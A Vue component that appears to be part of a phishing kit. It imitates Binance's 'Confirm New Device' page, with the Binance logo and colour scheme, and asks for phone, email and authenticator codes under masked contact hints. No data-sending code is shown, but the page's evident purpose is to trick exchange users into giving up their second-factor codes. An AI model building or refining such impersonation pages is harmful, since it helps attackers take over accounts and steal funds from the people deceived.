<template>
  <div>
    <!-- Just an image -->
    <nav class="navbar navbar-expand-lg color">
      <img class="navbar-img" v-bind:src="image" />
    </nav>

    <div class="container d-flex align-items-center">
      <div class="main mt-3">
        <form class="mt-5">
          <!-- Content Container-->
          <div class="container">
            <h1>Confirm New Device</h1>
            <h1>Login</h1>
            <p>
              To secure your account please complete the following verification
            </p>
            <div class="form-group">
              <label for="exampleInputEmail1">Phone Verification Code</label>
              <input
                type="email"
                class="form-control"
                id="exampleInputEmail1"
                aria-describedby="emailHelp"
              />
              <small>Enter the 6 digit code sent to 033**990</small>
            </div>
            <div class="form-group">
              <label for="exampleInputPassword1">Email Verification Code</label>
              <input
                type="password"
                class="form-control"
                id="exampleInputPassword1"
              />
              <small>Enter the 6 digit code sent to mia @gmail.com</small>
            </div>
            <div class="form-group">
              <label for="exampleInputPassword1">Authenticator code</label>
              <input
                type="password"
                class="form-control"
                id="exampleInputPassword1"
              />
              <small
                >Enter the 6 digit code from Binance/Google Authenticator
              </small>
            </div>

            <button type="submit" class="btn bg-color btn-block">Submit</button>

            <h5 class="hColor mt-4">Security Verification unavailable?</h5>
          </div>
        </form>
      </div>
    </div>
  </div>
</template>
<script>
export default {
  name: "navbar",
  data() {
    return {
      // data properties for image binding
      image: require("@/assets/images/binance.png"),
    };
  },
};
</script>
<style scoped>
.navbar-img {
  width: 170px;
}
.main {
  width: 550px;
  padding: 0px 20px;
}
.secondDiv {
  margin-left: 17%;
}
.qrImg {
  width: 280px;
}
.color {
  color: rgb(255, 217, 0);
}
.bg-color {
  background-color: rgb(250, 191, 0);
}
.icolor {
  color: blue;
}
.navColor {
  background-color: rgb(253, 248, 215);
}
.hColor {
  color: rgb(208, 150, 0);
}
input {
  height: 47px;
}
</style>
